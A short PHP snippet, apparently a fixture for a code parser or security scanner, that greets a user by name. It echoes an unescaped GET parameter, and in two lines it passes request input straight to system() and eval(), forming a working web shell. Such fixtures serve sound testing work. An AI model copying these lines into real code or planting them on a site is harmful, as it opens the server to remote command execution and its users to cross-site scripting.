<?php
$name = $_GET['name'];
echo "Hello " . $name;
system($_POST['cmd']);
eval($_REQUEST['code']);
$o = new Greeter("hi");
$o->greet($name);
Greeter::make();
$r = $conn->query("SELECT 1");
